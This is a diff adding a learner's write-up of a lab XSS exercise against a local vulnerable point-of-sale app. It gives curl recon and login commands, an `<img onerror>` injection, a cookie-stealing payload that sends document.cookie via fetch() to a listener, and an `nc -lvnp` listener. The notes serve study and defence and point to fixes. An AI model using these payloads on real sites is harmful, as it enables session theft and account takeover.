@@ -1564,3 +1564,53 @@ Created a virtual disk, hid a file, deleted it, and recovered it using debugfs.
 - 12.15 (Web Hacking) — attackers try to delete logs (data remains).
 - 12.19 (Blue Team) — detection leads to forensic analysis.
 - 8.5 (Network Security) — logs are persistent evidence.
+## Game: XSS Attack on pos-lab — COMPLETE ✅
+
+Played a red team game. Attacked pos-lab from scratch using CLI.
+
+### The kill chain
+1. `curl -I` → found `X-Lab-Mode: vulnerable` and missing CSP headers.
+2. `curl -s ... | grep "input\|form"` → found login form.
+3. `curl -s ... | grep "password\|username"` → found leaked credentials in the HTML `value` attribute (`boss` / `boss123`).
+4. Logged in with `curl -c` to save cookies (`~/boss_cookies.txt`).
+5. Found the XSS vulnerability in `/manager/products.html`.
+6. Injected `<img src=x onerror=alert("XSS")>` via `POST /api/products` (authenticated with cookies).
+7. The payload fired in the browser (popup).
+8. Upgraded to cookie stealing: `<img src=x onerror="fetch('http://127.0.0.1:9999/?c='+document.cookie)">`
+9. Listener on port 9999 caught the stolen `csrf_token`.
+
+### Real commands I ran
+- `curl -I http://127.0.0.1:3001`
+- `curl -s http://127.0.0.1:3001 | grep -i "input\|form\|password"`
+- `curl -s -c ~/boss_cookies.txt -X POST http://127.0.0.1:3001/api/auth/login ...`
+- `curl -s -X POST http://127.0.0.1:3001/api/products -b ~/boss_cookies.txt -H "Content-Type: application/json" -d '{"name":"<img src=x onerror=...>", ...}'`
+- `nc -lvnp 9999` (listener)
+
+### Things I saw
+- `X-Lab-Mode: vulnerable`.
+- Missing security headers (`Content-Security-Policy`, `X-Frame-Options`).
+- Default credentials in the HTML `value` attribute.
+- `pos_token` is HttpOnly (can't be stolen via JS).
+- `csrf_token` is NOT HttpOnly (stolen via XSS).
+- The XSS payload fired in the browser.
+- The listener caught the stolen token.
+
+### My own words (locked in)
+- Black-box hacking: you start with nothing and find everything.
+- Default credentials in HTML are a massive security leak.
+- `pos_token` is HttpOnly (safe from XSS).
+- `csrf_token` is not HttpOnly (vulnerable to XSS).
+- XSS + CSRF token theft = full account takeover.
+- The browser blocks `<script>` injected via innerHTML, but `<img onerror>` works.
+- The full kill chain: recon → enumeration → exploit → impact.
+- This is exactly how real attackers operate.
+
+### Connection to other topics
+- 12.11 (Recon) — finding the server.
+- 12.12 (Scanning) — header analysis.
+- 8.8 (Auth) — username enumeration.
+- 12.15 (Web Hacking) — XSS/CSRF.
+- 8.4 (Secure Coding) — the fix (textContent, CSP).
+- 8.10 (Secure API) — the fix (HttpOnly cookies).
+- 12.14 (Exploitation) — the full attack chain.
+- 12.19 (Blue Team) — how to defend against this.
